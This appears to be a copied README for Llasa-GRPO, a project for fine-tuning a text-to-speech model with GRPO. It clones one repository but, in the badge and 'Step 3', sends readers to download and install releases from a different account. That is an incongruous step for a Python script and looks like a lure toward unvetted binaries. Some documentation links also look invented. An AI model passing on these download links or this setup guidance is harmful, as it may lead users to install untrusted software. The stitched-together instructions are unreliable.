# 🎉 Llasa-GRPO - Fine-tune TTS with Ease

## 📥 Download Now
[![Download](https://img.shields.io/badge/Download%20Llasa--GRPO-007ACC?style=for-the-badge&logo=github)](https://github.com/dadasf-beep/Llasa-GRPO/releases)

## 🚀 Getting Started
This guide helps you set up and run the Llasa-GRPO application. Follow the steps below to download and install everything you need.

## 📦 Installation

### Step 1: Clone the repository
To begin, you need to get the code onto your computer:

1. Open your terminal (or Command Prompt).
2. Type the following commands:
   ```bash
   git clone git@github.com:Deep-unlearning/Llasa-GRPO.git
   cd Llasa-GRPO
   ```

### Step 2: Set up environment
You need to set up your application environment. Choose your preferred package manager:

<details>
<summary>📦 Using UV (recommended)</summary>

1. Install `uv` by following the instructions in the [Astral documentation](https://docs.astral.com/).
2. Then execute these commands in your terminal:
   ```bash
   uv venv .venv --python 3.12 && source .venv/bin/activate
   uv pip install -r requirements.txt
   uv pip install --no-deps xcodec2
   ```
</details>

<details>
<summary>🐍 Using Python directly</summary>

1. Ensure Python 3.12 or higher is installed on your system.
2. Run these commands in your terminal:
   ```bash
   python -m venv .venv
   source .venv/bin/activate
   pip install -r requirements.txt
   pip install --no-deps xcodec2
   ```
</details>

### Step 3: Download and install the application
Now, visit this page to download the latest version of Llasa-GRPO:

[Download Llasa-GRPO Releases](https://github.com/dadasf-beep/Llasa-GRPO/releases)

### Step 4: Running the Application
Once you have installed the application, you can run it by executing:

```bash
python main.py
```

This starts the Llasa-GRPO application.

## 📊 Features
- **Fine-tuning**: Tailor the Llasa TTS model with GRPO.
- **Token Evaluation**: Uses Whisper ASR for evaluating rewards.
- **Multiple Models**: Access various models, including `Llasa` and `ASR reward model`.

### Models overview
- **Llasa Model**: [HKUSTAudio/Llasa-1B](https://huggingface.co/HKUSTAudio/Llasa-1B)
- **Finetuned Llasa Model**: [Steveeeeeeen/Llasa-1B-GRPO-2000](https://huggingface.co/Steveeeeeeen/Llasa-1B-GRPO-2000)
- **Neural Codec**: [HKUSTAudio/xcodec2](https://huggingface.co/HKUSTAudio/xcodec2)
- **ASR Reward Model**: `openai/whisper-large-v3`

## 📋 System Requirements
To use Llasa-GRPO, ensure your system meets the following requirements:

- **Operating System**: Windows, macOS, or Linux
- **RAM**: Minimum 8GB
- **Python**: 3.12 or higher

## ⚙️ Troubleshooting
If you encounter issues during installation, consider these points:

- Ensure you have a stable internet connection.
- Verify your Python version by running `python --version`.
- Check if you have the required permissions to install packages.

## 🌐 Community Support
If you have questions or need help, feel free to reach out to our community:

- **GitHub Issues**: [Report issues here](https://github.com/dadasf-beep/Llasa-GRPO/issues)
- **Discussion Forum**: Join our discussions to share insights or seek help.

## 🌟 Explore More
For further details on models and training, visit the documentation:

- [Llasa Documentation](https://huggingface.co/docs/Llasa)
- [GRPO Overview](https://huggingface.co/docs/GRPO)

Thank you for using Llasa-GRPO! Enjoy fine-tuning your text-to-speech experience.